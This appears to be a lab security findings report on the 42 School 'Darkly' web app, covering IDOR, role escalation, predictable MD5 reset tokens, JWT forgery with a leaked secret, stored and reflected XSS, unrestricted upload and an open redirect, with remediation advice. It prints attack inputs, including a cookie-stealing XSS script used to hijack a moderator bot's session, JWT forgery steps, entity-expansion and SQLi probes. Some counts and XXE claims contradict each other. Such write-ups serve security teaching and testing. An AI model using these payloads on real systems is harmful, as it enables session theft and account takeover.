# Darkly Security Findings Report

**Date:** 2026-10-21 – 2026-11-06  
**Target:** 42 School Darkly (FastAPI port 4942, PocketBase port 8090)  
**Scope:** Web application security assessment (OWASP Top 10 focus)

---

## Executive Summary

A comprehensive security assessment of the 42 School "Darkly" platform uncovered **12 confirmed vulnerabilities** across multiple OWASP categories, ranging from authentication bypass and privilege escalation to injection attacks and insecure file handling. The assessment identified **6 captured flags** indicating successful exploitation chains.

---

## Confirmed Vulnerabilities

### 1. **IDOR on `/api/grades?student={id}`**
- **OWASP Class:** A01 – Broken Access Control
- **Severity:** HIGH
- **Description:** Authenticated students can enumerate and retrieve grade records for any other student by modifying the `?student={id}` parameter. No ownership validation on the backend.
- **Evidence:**
  - Logged in as `jdoe` (student role)
  - Changed `?student=` to `thanos`'s ID (`sf6wtjycbyev4ah`)
  - Returned full grade records including projects, scores, and metadata
- **Impact:** Cross-account grade data exposure for all students
- **Folder:** [`IDOR_Grades_Enumeration/`](IDOR_Grades_Enumeration/explanation.md)

---

### 2. **Role Self-Escalation via `PATCH /api/profile`**
- **OWASP Class:** A01 – Broken Access Control (Mass Assignment)
- **Severity:** CRITICAL
- **Description:** The `PATCH /api/profile` endpoint accepts a `role` field and applies it to the authenticated user without validation, allowing any user to grant themselves any role.
- **Evidence:**
  - `PATCH /api/profile` with `{"role":"cadet"}` accepted and applied
  - User's role changed from `student` to `cadet` in real-time
  - No server-side role check before update
- **Flag:** `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
- **Impact:** Privilege escalation to cadet/staff roles; access to restricted endpoints
- **Folder:** [`API_Profile_Privilege_Escalation/`](API_Profile_Privilege_Escalation/explanation.md)

---

### 3. **Password Reset Token is MD5**
- **OWASP Class:** A02 – Cryptographic Failures
- **Severity:** CRITICAL
- **Description:** The password reset token is not random; it is derived from a simple hash function: `token = md5(email)`. This is deterministic and predictable.
- **Evidence:**
  - Token for `thanos@student.42.tech`: `7c983aa3101755740f5fc820637a43d9`
  - Verified: `md5("thanos@student.42.tech")` = same token
  - `/reset-password?email={email}&token={md5(email)}` allows immediate password change
- **Flag:** `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
- **Attack Chain:** Any user can reset any other user's password without knowledge of current credentials
- **Impact:** Full account takeover via password reset
- **Folder:** [`Password_Reset_MD5_Token/`](Password_Reset_MD5_Token/explanation.md)

---

### 4. **Weak Password on `jdoe`**
- **OWASP Class:** A07 – Identification & Authentication Failures
- **Severity:** HIGH
- **Description:** The `jdoe` account has a weak password that appears near the top of the rockyou.txt wordlist.
- **Evidence:**
  - Forum post hints that the password is in a "famous list"
  - 20-word probe: `jdoe` / `abc123` succeeded
  - Full credentials: `jdoe@student.42.tech` / `abc123`
- **Impact:** Full account takeover via password cracking
- **Folder:** [`Weak_Password_Jdoe/`](Weak_Password_Jdoe/explanation.md)

---

### 5. **Stored XSS in Forum Posts (`POST /forum/new`)**
- **OWASP Class:** A03 – Injection
- **Severity:** CRITICAL
- **Description:** The forum's `content` field accepts raw HTML with zero sanitization. HTML comments confirm: *"the 'HTML is supported for formatting' note is not ironic at all"*
- **Evidence:**
  - `POST /forum/new` with `content=<script>alert(document.cookie)</script>`
  - Script renders unescaped in `<div class="post-content">`
  - Executes for every visitor to the post
- **Payload:** `<script>fetch("/api/collect?c="+encodeURIComponent(document.cookie))</script>`
- **Impact:** Persistent XSS; drive-by session hijacking
- **Folder:** consolidated into [`Stored_XSS_Session_Hijack/`](Stored_XSS_Session_Hijack/explanation.md) —
  same injection point taken to its full exploitation chain (moderator
  session theft), no separate folder created to avoid duplicating the
  same vulnerability twice.

---

### 6. **Reflected XSS on `/newsletter`**
- **OWASP Class:** A03 – Injection
- **Severity:** MEDIUM
- **Description:** The newsletter endpoint accepts any string as `email` with no validation and reflects it unescaped in the success message.
- **Evidence:**
  - `POST /newsletter` with `email=<script>alert(1)</script>`
  - Redirects to `/newsletter?email=%3Cscript%3E...`
  - Banner renders: *"You're now subscribed with: <script>alert(1)</script>"* unescaped
- **Impact:** Reflected XSS; link-based phishing attacks
- **Folder:** [`Reflected_XSS_Newsletter/`](Reflected_XSS_Newsletter/explanation.md)

---

### 7. **Full Chain: Stored XSS → Open Exfil Log → Moderation Bot Session Hijack**
- **OWASP Class:** A05 – Security Misconfiguration (Debug Endpoint)
- **Severity:** CRITICAL
- **Description:** A combination of three security flaws enables session hijacking of the moderation bot:
  1. Stored XSS in forum (confirmed above)
  2. `/api/collect?c=<data>` debug endpoint logs arbitrary data with no auth
  3. `GET /api/collect` (no params) returns the entire log to anyone
  4. Moderation bot opens new forum posts with a live, non-HttpOnly session
- **Evidence:**
  - Posted bait forum thread with: `<script>fetch("/api/collect?c="+encodeURIComponent(document.cookie))</script>`
  - Within seconds, bot (User-Agent: `HeadlessChrome`) visited and exfiltrated
  - Log entry included moderator's full session JWT and flag cookie in plaintext
- **Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
- **Captured Data:** Moderator's session token, flag cookie
- **Impact:** Full session takeover of moderation bot; access to all moderated content
- **Folder:** [`Stored_XSS_Session_Hijack/`](Stored_XSS_Session_Hijack/explanation.md)

---

### 8. **XML Entity Expansion (Billion Laughs) in `/agenda/import`**
- **OWASP Class:** A03 – Injection (Partial XXE – Denial of Service)
- **Severity:** MEDIUM
- **Description:** The agenda import endpoint parses XML with stdlib `xml.etree.ElementTree` without entity expansion limits. HTML comments confirm: *"the importer parses any XML you upload, entities and all"*
- **Evidence:**
  - File upload at `/agenda` → `POST /agenda/import`
  - Internal entity expansion works: `<!ENTITY a "X"><!ENTITY b "&a;&a;...">` expands correctly
  - Tested: 3-level nested entities (max 1000 chars) expanded in 74ms
  - External entities (`SYSTEM "file://..."`) blocked by default in CPython's expat parser
- **Impact:** Entity-expansion DoS exploitable; file-read XXE is NOT
- **Folder:** [`XXE_Entity_Expansion/`](XXE_Entity_Expansion/explanation.md)

---

### 9. **Unrestricted File Upload via `POST /upload/avatar`**
- **OWASP Class:** A04 – Insecure Design
- **Severity:** CRITICAL
- **Description:** Avatar upload has no file-type or extension filtering. Deploy log confirms: `v1.3.3 — wil — "quick fix on file upload" (removed the whitelist entirely)`
- **Evidence:**
  - `POST /upload/avatar` (multipart field `file`)
  - Accepted `.txt`, `.html`, `.svg` without resistance
  - Stored as `/static/uploads/{user_id}_{filename}`
  - Served back with REAL content-type:
    - `.html` → `text/html` (full page, same origin)
    - `.svg` → `image/svg+xml` (executes embedded `<script>`)
- **Flag:** `FLAG{unr3str1ct3d_upl0ad_g0_brrr}`
- **Impact:** Same-origin stored XSS via any file type; no forum required
- **Folder:** [`Unrestricted_File_Upload/`](Unrestricted_File_Upload/explanation.md)

---

### 10. **JWT Signing Secret Forgery (`"42network"`)**
- **OWASP Class:** A02 – Cryptographic Failures
- **Severity:** CRITICAL
- **Description:** Session JWTs are signed with a weak, historically-leaked secret (`"42network"`) that can be derived from HTML comments.
- **Evidence:**
  - Deploy log in HTML comments: `v1.2.0 — initial platform. jwt secret was "42". wil changed it to "42network".`
  - Verified offline: Current JWTs verify against `"42network"` using HMAC-SHA256
  - Forged token for `thanos` (sub: `sf6wtjycbyev4ah`) without password
  - Server validated the existing user but accepted the forged token
- **Flag:** `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` (found in sophie's admin panel after impersonation)
- **Attack Method:**
  1. Extract JWT payload (base64, no encryption)
  2. Forge new header/payload with target `sub` and desired `role`
  3. Sign with leaked secret `"42network"`
  4. Use forged token to impersonate any existing user
- **Limitations:** `role` claim not trusted everywhere (e.g., `/staff/dashboard` re-validates)
- **Impact:** Full session takeover of any known user ID without credentials
- **Folder:** [`JWT_Forgery_Impersonation/`](JWT_Forgery_Impersonation/explanation.md)

---

### 11. **Open Redirect via `/redirect?next=<url>`**
- **OWASP Class:** A01 – Broken Access Control
- **Severity:** MEDIUM
- **Description:** The `/redirect` endpoint accepts an unvalidated `next` parameter and performs a 307 redirect to any external URL.
- **Evidence:**
  - `GET /redirect?next=https://evil.example.com` → HTTP 307 → `evil.example.com`
  - No allow-list validation; any URL accepted
- **Impact:** Phishing attacks (link appears trusted domain, redirects off-site)
- **Folder:** [`Open_Redirect/`](Open_Redirect/explanation.md)

---

### 12. **Debug Headers Leak Backend Topology**
- **OWASP Class:** A05 – Security Misconfiguration
- **Severity:** LOW
- **Description:** Every HTTP response includes debug headers exposing internal infrastructure.
- **Evidence:**
  - All responses include:
    - `x-pocketbase: http://localhost:8090` (backend URL)
    - `x-42-internal: campus=paris` (campus metadata)
  - HTML comments reference: *"TODO: remove debug headers before v1.4 release"*
- **Impact:** Information disclosure; assists reconnaissance
- **Folder:** [`Debug_Headers_Disclosure/`](Debug_Headers_Disclosure/explanation.md)

---

### 13. **PII Exposed on Public Profile Pages**
- **OWASP Class:** A01 – Broken Access Control
- **Severity:** LOW
- **Description:** User profile pages require no authentication and expose email addresses.
- **Evidence:**
  - `/profile/{user_id}` returns full email in plaintext: `jdoe@student.42.tech`
  - No auth required; accessible to any visitor
- **Impact:** User PII enumerable via user ID enumeration
- **Folder:** [`PII_Profile_Disclosure/`](PII_Profile_Disclosure/explanation.md)

---

## Ruled Out (Tested, Not Vulnerable)

### Search Parameter (SQL Injection)
- `/forum?search=a+OR+1=1` → 0 results (expected all posts if vulnerable)
- Quoted variant `search=zzzz' OR '1'='1` → 0 results
- Lone quote `search=a'` → No SQL error exposed
- Conclusion: Parameterized query; not vulnerable to SQLi

### `/api/telemetry/heartbeat` (Debug Endpoint)
- Every input (valid JSON, malformed, missing fields, wrong types, oversized) → identical response
- No parsing, validation, or reflection
- Conclusion: Dead endpoint; no exploitable surface

---

## Recommendations

1. **Immediate (CRITICAL):**
   - Rotate JWT signing secret; use a strong, random value from a secrets manager
   - Implement server-side role validation on all protected endpoints
   - Replace MD5 reset tokens with cryptographically random 32+ char tokens
   - Sanitize forum content with an HTML allow-list (defusedxml-like approach)
   - Remove debug headers from production builds

2. **Short-term (HIGH):**
   - Enforce password complexity requirements; check against breach databases (e.g., HaveIBeenPwned API)
   - Set `HttpOnly` and `Secure` on session cookies; implement `SameSite`
   - Restrict file uploads: enforce MIME type and extension whitelist
   - Add rate limiting to password reset and login endpoints
   - Remove `/api/collect` debug endpoint or restrict to admin-only

3. **Medium-term (MEDIUM):**
   - Implement Content-Security-Policy header to mitigate XSS impact
   - Add allow-list validation to `/redirect?next=` parameter
   - Re-enable `defusedxml` for XML parsing (or use a safer parser)
   - Require authentication for all profile pages; strip PII from unauthenticated responses
   - Implement proper input validation and output encoding across all endpoints

4. **Long-term:**
   - Conduct a full security code review focusing on input validation
   - Set up automated security testing in CI/CD pipeline
   - Implement security headers and monitoring
   - Consider a professional penetration test after fixes

---

## Flags Captured

| Flag | Vulnerability | Endpoint | Impact |
|------|---|---|---|
| `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | PATCH /api/profile privilege escalation | `/api/profile` | Role self-escalation |
| `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | Password reset token is MD5 | `/reset-password` | Account takeover |
| `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | JWT forgery; admin impersonation | Sophie's admin panel | Full admin access |
| `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | Stored XSS → session hijack chain | `/forum/new` + `/api/collect` | Moderator session theft |
| `FLAG{unr3str1ct3d_upl0ad_g0_brrr}` | Unrestricted file upload | `/upload/avatar` | Stored XSS via upload |
| `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | XXE → SSRF on `/internal/config` (external `SYSTEM "http://..."` entity — distinct from the internal-only entity-expansion DoS in finding #8) | `/agenda/import` | Internal config + credential leak — see [`XXE_SSRF_Internal_Config/`](XXE_SSRF_Internal_Config/explanation.md) |

Finding #1 (IDOR) does **not** produce a flag of its own — walking it
across every known student id only ever turns up a non-empty `flag` field
on the attacker's *own* record (already counted above), never on another
student's. It's documented with full `exploit.sh`/`explanation.md` but no
`flag` file.

Finding #4 (weak `jdoe` password) *does* reach `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
in its folder — but only because this lab instance's `jdoe` account
happens to already be `cadet`-escalated from finding #2. That's incidental
to this run, not an intrinsic property of password-cracking; see
`Weak_Password_Jdoe/explanation.md` for the caveat.

---

## Testing Methodology

- **Tools:** curl (silent mode, header-only requests where possible), jq for JSON parsing, Python REPL for JWT operations
- **Approach:** Non-destructive, local testing only; no external requests or data exfiltration beyond the lab environment
- **Credentials:** Test account `jdoe@student.42.tech` / `abc123` (lab-local, low-risk)
- **Scope:** FastAPI app (port 4942) and PocketBase backend (port 8090) on localhost

---

## Conclusion

The Darkly platform exhibits multiple critical security flaws across authentication, authorization, input validation, and data protection. The most severe are the hardcoded JWT secret, unvalidated password reset tokens, and unrestricted file uploads, each of which independently enables full account or system compromise. Combined, they create a series of exploitation chains that were successfully demonstrated.

Immediate remediation of the CRITICAL issues is essential before any production deployment.
